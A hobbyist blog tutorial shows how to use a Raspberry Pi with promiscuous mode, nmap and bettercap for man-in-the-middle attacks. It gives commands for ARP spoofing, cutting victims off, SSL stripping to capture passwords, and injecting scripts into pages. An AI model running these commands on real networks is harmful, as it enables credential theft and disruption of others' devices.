---
title: 'HackOTG (v1.4): See all traffic on a network with Promiscuous mode and Bettercap'
layout: post
categories:
  - HackOTG
tags:
  - bettercap
  - mitm
  - promiscuous
  - sniffing
  - spoofing
---
 _This article is part of a series:_ _[you can find the first article here](/2017/10/07/hackotg-v1-0-universal-portable-security-platform/)__. If you missed the previous one,_ _[it is here](/2017/10/11/hackotg-v1-3-creating-our-own-hotspot-on-boot/)__._

## First, the basics

Your network card (WiFi or ethernet) is your gateway to your network and the rest of the internet. The most common way to use it is to connect to an existing network, get an IP and done! But a network card can do many other things. A good example is that WiFi cards can set up a WiFi-hotspot themselves [(mobile phone tethering)](https://www.computerworld.com/article/2499772/mobile-wireless/mobile-wireless-wi-fi-tethering-101-use-a-smartphone-as-a-mobile-hotspot.html). We did this to the card of our HackOTG in [one of the previous articles](https://demgeeks.com/hackotg-v1-3-creating-our-own-hotspot-on-boot/).

In the normal &#8216;client&#8217; mode, which is just being connected to an existing network our network-card will only process packets that are directly meant for us to use or send through. We can change this behavior in 2 ways.
  
You can go into [Monitor mode](https://en.wikipedia.org/wiki/Monitor_mode), which means you can now see the packets in the air without connecting (associating) with any Wifi access point. Think of it like listening to people&#8217;s conversations while you walk down the street.
  
There is also [Promiscuous](https://en.wikipedia.org/wiki/Promiscuous_mode) [mode](https://en.wikipedia.org/wiki/Promiscuous_mode), which is processing all packets touching the network-card. In a wireless system, you will have to be in proximity of the transmitting device, in a wired ethernet-network the packets must go through cable in which you are connected. In a normal switch setup, a packet will not be forwarded by the router, because it knows which devices are connected on which line.

Monitor mode is not very commonly supported because the main public does not use it. _Promiscuous mode_ is more commonly available.
  
Without installing extra modules or changing drivers in our Raspberry Pi zero, we can only do _p_, which is fine for what we want to do. To test out which modes are supported you can do the following:

<pre>iw list</pre>

Now in the output you will find a list of supported modes. You must know the physical-id (Phy#) of your device (not needed if you have only one).

<pre class="output">[...] 
Supported interface modes: 
* IBSS 
* managed 
* AP 
* AP/VLAN 
* monitor 
* P2P-client 
* P2P-GO 
* P2P-device 
[...]</pre>

## Watch your own traffic

First, connect to a WiFi-hotspot with your HackOTG with the 2 scripts (connect\_wifi\_\***.sh and route_wlan0.sh) we made in [this article](https://demgeeks.com/hackotg-v1-2-basic-connectivity-to-internet/).
  
Now if we check the status of our network-cards with the following command, we can see the FLAGS at the end. The &#8220;P&#8221;-flag means promiscuous. As you can see, there&#8217;s none, because our device is not in the _Promiscuous mode_.

<pre>netstat -i</pre>

<pre class="output">Kernel Interface table
Iface MTU   RX-OK RX-ERR RX-DRP RX-OVR TX-OK TX-ERR TX-DRP TX-OVR Flg
lo    65536 55    0      0      0      55    0      0      0      LRU
usb0  1500  2039  0      0      0      502   0      0      0      BMRU
wlan0 1500  2482  0      1      0      147   0      0      0      BMRU</pre>

Let&#8217;s check what we can see going through our card right now by installing a tool called &#8220;tshark&#8221;, the terminal-equivalent of wireshark (a quite famous program).

<pre>sudo apt-get install tshark</pre>

Just press &#8220;no&#8221; () if you get asked about the dumpcat program and about running the tshark program as a non-superuser. To use tshark on your wireless interface, use the following command:

<pre>sudo tshark -i wlan0</pre>

Now to generate some traffic run, log in to your HackOTG with another session and run &#8220;sudo apt-get update&#8221;. You can now see the traffic generated by the HackOTG.

<pre class="output">[...]
21 45.328684570 192.168.1.51 → 192.168.1.1 DNS 87 Standard query 0xeac0 A mirrordirector.raspbian.org 
22 45.331851556 192.168.1.51 → 192.168.1.1 DNS 83 Standard query 0xa5b2 A archive.raspberrypi.org 
23 45.332182555 192.168.1.51 → 192.168.1.1 DNS 87 Standard query 0x9b47 AAAA mirrordirector.raspbian.org 
24 45.332410554 192.168.1.51 → 192.168.1.1 DNS 83 Standard query 0xb93d AAAA archive.raspberrypi.org
[...]</pre>

Now do the same, but first put the card in _promiscuous mode_ before running the _tshark-command_. To put your card in _promiscuous mode_, do the following:

<pre>sudo ifconfig wlan0 promisc</pre>

To check if it worked, see the extra &#8220;P&#8221; flag at the end:

<pre>netstat -i</pre>

<pre class="output">Kernel Interface table
Iface MTU   RX-OK RX-ERR RX-DRP RX-OVR TX-OK TX-ERR TX-DRP TX-OVR Flg
lo    65536 55    0      0      0      55    0      0      0      LRU
usb0  1500  2039  0      0      0      502   0      0      0      BMRU
wlan0 1500  2482  0      1      0      147   0      0      0      BMRPU</pre>

Now if we run our _tshark-command_ again:

<pre>sudo tshark -i wlan0</pre>

And after generating some traffic&#8230; You won&#8217;t see any more than before. This is because you are probably on an encrypted WiFi-access point and you&#8217;ll only be able to decrypt the traffic meant for you. So the only question that rests is &#8220;How can we make the others on the network send their traffic through us&#8221;? Read on&#8230;
  
You can disable _promiscuous mode_ with this command:

<pre>sudo ifconfig wlan0 -promisc</pre>

## See and interfere with others&#8217; traffic (MitM)

So to get all the traffic of the network (or form a specific set of hosts) through our system, we can use a lot of different techniques. Apart from physicly being the gateway or inline with the host we have multiple techniques to reroute traffic if we are a normal client to the network. Being in the position where all the traffic flows through is called [Man in the Middle](https://en.wikipedia.org/wiki/Man-in-the-middle_attack). From there you&#8217;ll be able to influence the traffic.

One of the ways to redirect the traffic is by abusing the [ARP-protocol](https://nl.wikipedia.org/wiki/Address_Resolution_Protocol). Which will tell everybody on the network that they are the gateway (basicly). There is a tool available for doing this _arpspoof._ But you&#8217;ll still have to search the IP&#8217;s of the real gateway and of all victims.

Many of the tools to redirect, change, filter and monitor traffic in a network are bundled in one called [bettercap](https://www.bettercap.org/). It is the next iteration of _ettercap_, also a very famous tool. Remember that bettercap is a great tool but stands on the shoulders of gaints by using other tools and techniques to interfere with traffic.
  
The rest of this article will go over the installation and basic usage of the tool and how to use it on your HackOTG. In general, these tools always need some dependecies and total control over the interface, so using HackOTG is perfect for this purpose.

### 1. Installation

There are a couple ways to install _Bettercap_, the most stable way and universal across all linux disto&#8217;s is to install _Bettercap_ with the gem package manager of the _ruby-_package. First make sure you have these dependencies:

<pre><span class="n">sudo apt-get install build</span><span class="o">-</span><span class="n">essential</span> <span class="n">ruby</span><span class="o">-</span><span class="n">dev</span> <span class="n">libpcap</span><span class="o">-</span><span class="n">dev</span></pre>

After retrieving the dependencies, install bettercap from the gem repository:

<pre><span class="n">sudo gem</span> <span class="n">install</span> <span class="n">bettercap</span></pre>

### 2. Usage

Bettercap has a lot of options, so I will try to go through a couple scenarios, make sure you also take a look at [their documentation](https://www.bettercap.org/index.html#options) to see the full range of capabilities.

_**Don&#8217;t run the following commands without reading what they do, if people are on your network, they will be affected. Nobody wants to hear people yelling when Netflix keeps dropping out or the printer doesn&#8217;t work anymore. Better safe then sorry.**_

So if you run Bettercap as:

<pre>sudo bettercap -I wlan0</pre>

Bettercap willl, by default, redirect traffic through our interface for all the hosts connected to that network. This is not a silent command, meaning if somebody was scanning the network for nefarious actions, they will spot you! But read on the learn about obfisquation of your traffic by changing your MAC adress (Think of it like a fingerprint), which will make the make and model of your device impossible to trace. Your IP will still be the same, that is something you can&#8217;t change.

To attack only specific hosts we will need to know an IP or a MAC. This is were somebody who can copy commands, becomes a hacker. There are many tools available to &#8220;scan&#8221; a network, but the famous _[nmap](https://nmap.org/)_-tool is a very good one. It is far to complex to explain all it&#8217;s features in this article, but check out the [documentation](https://nmap.org/) if you want to know more. You can install it with _sudo_ _apt-get install nmap_ and then **run the following command:**

<pre>sudo nmap -sn 192.168.1.*</pre>

This tool will go over all the addresses specified and give you back some info:

<pre class="output">[...]
MAC Address: B8:27:EB:4E:0C:42 (Raspberry Pi Foundation)
Nmap scan report for 192.168.1.14
Host is up (-0.13s latency).
MAC Address: 10:02:B5:D6:08:8A (Intel Corporate)
Nmap scan report for vanboven.lan (192.168.1.20)
Host is up (-0.19s latency).
[...]</pre>

If you can&#8217;t determine the IP or MAC you have to check for certain traffic (later on in this article) to try to pinpoint a certain host. (attacking only a set of hosts is way more effective and puts less strain on the network and your system). You can always just walk over to a device an retrieve it&#8217;s IP if it&#8217;s just for demonstration purposes.

If you don&#8217;t know the addresses to scan, or if you want to automate the command, use this script **scan_networks.sh**:

<pre class="output">for a in $(hostname -I)
do
    if [ "${#a}" -lt 16 ]; then
        sudo nmap -sn $(echo $a | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | rev | cut -d . -f2- | rev).*
    fi
done</pre>

Simply run the following command to get all the hosts on the networks attached on all interfaces:

<pre>sh scan_networks.sh</pre>

**Now we can complete our** **_bettercap_****-command with a couple of victims to attack:**

<pre>sudo bettercap -I wlan0 -T 192.168.1.14, 192.168.1.9</pre>

**Another options is to specify a target by MAC address:**

<pre>sudo bettercap -I wlan0 -T 01:23:45:67:89:10</pre>

**Or to attack a range of IP addresses:**

<pre>sudo bettercap -I wlan0 -T 192.168.1.1-30</pre>

**You can also specify the addresses to ignore (but attack all others:**

<pre>sudo bettercap -I wlan0 --ignore 192.168.1.14, 192.168.1.9</pre>

### 3. Example attacks

What you created above, will be your basic command, which will redirect all trafic, but will do nothing with it. Not even look at it. **If you want to see of the traffic that is going trough, add -X (sniffer) to the command.**

<pre>sudo bettercap -I wlan0 -T 192.168.1.14, 192.168.1.9 -X</pre>

<pre class="output">[I] Starting [ spoofing:✔ discovery:✘ sniffer:✔ tcp-proxy:✘ udp-proxy:✘ http-proxy:✘ https-proxy:✘ sslstrip:✘ http-server:✘ dns-server:✘ ] ...

[I] [wlan0] 192.168.1.17 : B8:27:EB:D8:B4:4A / wlan0 ( Raspberry Pi Foundation )
[I] Found hostname dsldevice for address 192.168.1.1
[I] [GATEWAY] 192.168.1.1 : 30:91:8F:9F:71:3C / dsldevice ( Technicolor )
[I] [TARGET] 192.168.1.14 : 10:02:B5:D6:08:8A ( Intel Corporate )
[192.168.1.14 &gt; 52.85.61.198:https] [HTTPS] https://api-v2.soundcloud.com/
[192.168.1.14 &gt; 52.85.61.198:https] [HTTPS] https://l9bjkkhaycw6f8f4.soundcloud.com/
[192.168.1.14 &gt; 52.85.62.252:https] [HTTPS] https://cf-hls-media.sndcdn.com/
[192.168.1.14 &gt; 52.85.61.198:https] [HTTPS] https://l9bjkkhaycw6f8f4.soundcloud.com/
[192.168.1.14 &gt; 52.85.62.252:https] [HTTPS] https://cf-hls-media.sndcdn.com/
[192.168.1.14 &gt; 52.85.61.184:https] [HTTPS] https://api.soundcloud.com/
[192.168.1.14 &gt; 52.85.62.252:https] [HTTPS] https://cf-hls-media.sndcdn.com/</pre>

As you can see, I was listening to music of the _soundcloud-_website on that device. We can also see the protocol used etc. Now from here we can enable options to inject, alter, kill or redirect traffic. Another powerful and easy attack to show is to **kill the traffic, which will make the device unable to connect to the internet or any other network-resource:**

<pre><span class="pre">sudo bettercap -T</span> <span class="pre">192.168.1.14</span> <span class="pre">--kill </span></pre>

You can also strip encryption (HTTPS, HSTS) till a certain extend by using other built-in techniques like _ssl-strip_: (the _-P POST_ is to filter on the protocol POST, where passwords will reside if found)

<pre>sudo bettercap -T 192.168.1.14 --proxy -P POST</pre>

<img class="alignnone wp-image-978 size-full" src="https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-31-at-11.46.46.png?resize=640%2C313&#038;ssl=1" alt="" srcset="https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-31-at-11.46.46.png?w=775&ssl=1 775w, https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-31-at-11.46.46.png?resize=300%2C147&ssl=1 300w, https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-31-at-11.46.46.png?resize=768%2C376&ssl=1 768w, https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-31-at-11.46.46.png?resize=640%2C313&ssl=1 640w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" />

As you can see (above) a password was captured:

<pre class="output">[REQUEST BODY]

RedirectUrl : http://www.standaard.be/
 EmailOrUsername : username
 Password : hellooooo</pre>

If you can&#8217;t strip the encryption (better safety), you can replace it with your own encryption layer. This will give a popup or alert on most modern browsers, but often victims will still go through, giving you a peek in that connection. Here is the command:

<pre>sudo bettercap -T 192.168.1.14 --proxy --proxy-https -P POST</pre>

<img class="alignnone wp-image-977 size-full" src="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-31-at-11.43.19.png?resize=640%2C422&#038;ssl=1" alt="" srcset="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-31-at-11.43.19.png?w=701&ssl=1 701w, https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-31-at-11.43.19.png?resize=300%2C198&ssl=1 300w, https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-31-at-11.43.19.png?resize=640%2C422&ssl=1 640w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" />

Now if we have control over the unencrypted data, we can change it in any way we want. Some easy examples for injection attacks are the following, you can still add the force https option to these:

**Make all pages pink:**

<pre>sudo bettercap -I wlan0 -T 192.168.1.14 --proxy-module injectcss --css-data '*{background-color:#fd3078!important; color:white!important}'</pre>

**Give a popup &#8220;HACKED&#8221;:** 

<pre>sudo bettercap -I wlan0 -T 192.168.1.14 --proxy-module injectjs --js-data 'alert("hacked");'</pre>

**Play youtube-video fullscreen on all visited pages:**

<pre>sudo bettercap -I wlan0 -T 192.168.1.14 --proxy-module injecthtml --html-file baby.html

#baby.html
&lt;iframe style="position:absolute; z-index:10000" width="100%" height="100%"
src="https://www.youtube.com/embed/kffacxfA7G4?autoplay=1" frameborder="0" allowfullscreen&gt;&lt;/iframe&gt;
&lt;div style="position:absolute;width:100%;height:100%;z-index:10001;"&gt;&lt;/div&gt;'</pre>

To give some easy demo&#8217;s, I made a script that contains these commands and a bit more. If you take a look at [this github-repo](https://github.com/larsveelaert/HackOTG), you can find all the files we use for the HackOTG, and the file [mitm.sh](https://github.com/larsveelaert/HackOTG/blob/master/mitm.sh), which is a general _bettercap-_script to use on any device. Just run it with _sh_ and answer the questions to automate the commands shown above.

So here we can end our attack on networks we already know the password to. Next we will dive into other ways to get control over a victims traffic.
